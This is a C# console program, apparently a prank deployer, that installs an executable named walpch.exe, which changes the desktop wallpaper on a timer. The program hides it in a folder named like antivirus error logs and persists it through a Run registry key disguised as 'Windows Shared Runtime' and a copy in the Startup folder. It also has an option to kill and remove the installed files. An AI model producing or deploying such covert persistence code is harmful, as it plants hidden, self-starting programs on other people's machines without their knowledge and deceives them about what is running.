using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace sendIT
{
    class Program
    {
        static string path;

        static void Main(string[] args)
        {
            playMusic();

            RegisterEddit reg = new RegisterEddit();
            path = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + "\\video\\avp\\errors\\";

            Console.Write("Deploy[1] or delete[2]: ");
            string ansver = Console.ReadLine();

            if (ansver == "1") // deploy program
            {
                reg.addStartup(path);
                sendPayload();

                Console.Write("Start now? [y/n]");
                ansver = Console.ReadLine();

                if (ansver == "y")
                {
                    System.Diagnostics.Process.Start(path + "walpch.exe");
                }
            }

            else // delete program
            {
                Console.Write("delete[1] or turn off[2]");
                ansver = Console.ReadLine();
                

                if (ansver == "1")
                {
                    try
                    {
                        System.Diagnostics.Process[] proc = System.Diagnostics.Process.GetProcessesByName("walpch"); //stop proces
                        proc[0].Kill();
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine(e);
                    }

                    try
                    {
                        reg.deleteStartup(path);
                        deleteEverything();
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine(e);
                    }
                }
                else
                {
                    try
                    {
                        System.Diagnostics.Process[] proc = System.Diagnostics.Process.GetProcessesByName("walpch"); //stop proces
                        proc[0].Kill();
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine(e);
                    }
                }


            }

        }

        static void sendPayload()
        {
            path = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + "\\video\\avp\\errors\\";

            if (!System.IO.Directory.Exists(path))
            {
                System.IO.Directory.CreateDirectory(path);
            }

            Console.Write("Set time between wallpapers change [in millisecond]: ");
            string delay = Console.ReadLine();  //set delay
            System.IO.StreamWriter conf = new System.IO.StreamWriter("payload\\conf.txt");

            conf.WriteLine(delay);
            conf.Close();

            System.IO.File.Copy("payload\\conf.txt", path + "conf.txt", true);  //copy conf and exe
            System.IO.File.Copy("payload\\walpch.exe", path + "walpch.exe", true);

            try
            {               
                System.IO.File.Copy("payload\\walpch.exe", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)+"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + "walpch.exe", true);
            }
            catch (Exception w)
            {
                Console.WriteLine(w);
            }

            

            copyImage();
        }
          
        static void copyImage()
        {
            string[] picturesFordelete = System.IO.Directory.GetFiles(path);
            string[] pictures = System.IO.Directory.GetFiles("payload\\");

            foreach (string name in picturesFordelete) // delete old images
            {
                if (name.Contains(".png") || name.Contains(".jpg") || name.Contains(".jpeg"))
                {
                    System.IO.File.Delete(name);
                }
            }

            foreach (string name in pictures) // copy new images
            {
                if (name.Contains(".png") || name.Contains(".jpg") || name.Contains(".jpeg"))
                {
                    Console.WriteLine(name.Substring(name.IndexOf("\\") + 1));
                    System.IO.File.Copy(name, path + name.Substring(name.IndexOf("\\") + 1), true);
                }
            }
        }

        static void playMusic()
        {
            try
            {
                System.Media.SoundPlayer player = new System.Media.SoundPlayer();

                player.SoundLocation = "test\\1.mp3";
                player.Play();
            }
            catch
            {
            }
        }

        static void deleteEverything()
        {
            if (System.IO.File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + "walpch.exe"))
                System.IO.File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + "walpch.exe");
                Console.Write(path);
            if(System.IO.File.Exists(path+ "walpch.exe"))
            {
                string[] filePaths = System.IO.Directory.GetFiles(path);
                foreach (string filePath in filePaths)
                    System.IO.File.Delete(filePath);

            }
        }
    }

    class RegisterEddit   // I add register editor to diferent class because it makes mess when it was static. DK why.
    {
         public void addStartup(string path)
        {
            Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            key.SetValue("Windows Shared Runtime", path + @"walpch.exe");
            //Console.WriteLine(path);
            key.Close();
        }

        public void deleteStartup(string path)
        {
            Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            key.DeleteValue("Windows Shared Runtime", false);
        }
    }
}
